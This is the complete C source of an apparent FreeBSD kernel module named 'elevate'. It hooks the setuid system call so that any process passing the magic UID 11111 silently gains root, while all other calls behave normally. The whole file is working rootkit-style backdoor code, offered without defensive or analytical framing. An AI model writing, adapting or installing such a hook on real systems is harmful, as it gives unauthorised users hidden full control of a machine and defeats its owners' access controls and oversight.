#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/proc.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>   // struct setuid_args 
#include <sys/syscall.h>    // SYS_setuid         
#include <sys/ucred.h>

#define MAGIC_UID 11111

// pointer to original setuid
static sy_call_t *osetuid;


static int
hooked_setuid(struct thread *td, void *syscall_args)
{
	struct setuid_args *uap = (struct setuid_args *)syscall_args;
	struct ucred *newcred, *oldcred;
	struct proc *p;

	if (uap->uid != MAGIC_UID)
		return (osetuid(td, syscall_args));

	p = td->td_proc;

	newcred = crget();
	PROC_LOCK(p);
	oldcred = crcopysafe(p, newcred);

	newcred->cr_uid = 0;
	newcred->cr_ruid = 0;

	proc_set_cred(p, newcred);
	PROC_UNLOCK(p);
	crfree(oldcred);
	return (0);
}

// Load/unload event handler.
static int
load(struct module *module, int cmd, void *arg)
{
	int error = 0;

	switch (cmd) {
	case MOD_LOAD:
		osetuid = sysent[SYS_setuid].sy_call;
		sysent[SYS_setuid].sy_call = (sy_call_t *)hooked_setuid;
		break;
	case MOD_UNLOAD:
		sysent[SYS_setuid].sy_call = osetuid;
		break;
	default:
		error = EOPNOTSUPP;
		break;
	}
	return (error);
}

static moduledata_t elevate_mod = {
	"elevate",	// module name
	load,		// event handler
	NULL		// extra data
};

DECLARE_MODULE(elevate, elevate_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
